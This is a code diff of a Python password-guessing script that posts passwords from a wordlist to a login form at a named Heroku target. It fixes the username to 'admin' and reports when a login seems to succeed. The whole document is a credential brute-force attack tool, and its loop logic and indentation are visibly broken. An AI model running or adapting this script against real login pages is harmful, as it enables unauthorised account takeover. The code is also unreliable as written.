@@ -20,23 +20,14 @@ headers = {
     'Referer': 'http://grabme.herokuapp.com/target/',
     'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,mr;q=0.6,pt;q=0.5',
 }
-        
-# Usernames In A List Format
-users = [ x.strip() for x in open('users.txt', 'r').readlines() if x ]
+
 # Passwords In A List Format
 passwords = [x.strip() for x in open('passwords.txt', 'r').readlines() if x]
 
 # Looping
 for password in passwords:
     data = {
-      'username': user,
-      'password': password,
-      'submit': 'Connexion'
-}
-
-for user in users:
-    data = {
-      'username': user,
+      'username': 'admin',
       'password': password,
       'submit': 'Connexion'
 }
@@ -47,5 +38,4 @@ response = requests.post('http://grabme.herokuapp.com/target/', headers=headers,
 
 if "incorrect username or password" not in response.text:
     print(Fore.GREEN + "Credentials Are Likely Found: ")
-    print(Fore.GREEN + "Username: ", user)
     print(Fore.GREEN + "Password: ", password)
